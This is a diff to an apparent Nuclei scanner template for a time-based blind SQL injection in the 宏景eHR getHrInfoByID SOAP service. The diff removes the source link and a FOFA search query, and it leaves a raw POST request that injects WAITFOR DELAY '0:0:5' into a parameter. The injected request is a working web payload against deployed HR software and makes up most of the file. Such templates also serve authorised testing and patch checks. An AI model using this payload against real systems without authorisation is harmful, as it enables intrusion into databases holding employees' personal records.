@@ -3,14 +3,8 @@ info:
   name: 宏景eHR getHrInfoByID 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/om1arddaoy5s438y
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: om1arddaoy5s438y
-    fofa: app="HJSOFT-HCM"
 http:
 - raw:
   - "POST /servlet/XFireServlet/HrpService HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml;charset=UTF-8\nContent-Length: 474\nConnection: close\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:hrp=\"http://www.hjsj.com/HrpService\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <hrp:getHrInfoByID>\n         <hrp:in0>1</hrp:in0>\n         <hrp:in1>1'WAITFOR DELAY '0:0:5'</hrp:in1>\n         <hrp:in2>1</hrp:in2>\n         <hrp:in3>1</hrp:in3>\n         <hrp:in4>1</hrp:in4>\n         <hrp:in5>1</hrp:in5>\n         <hrp:in6>1</hrp:in6>\n      </hrp:getHrInfoByID>\n   </soapenv:Body>\n</soapenv:Envelope>"
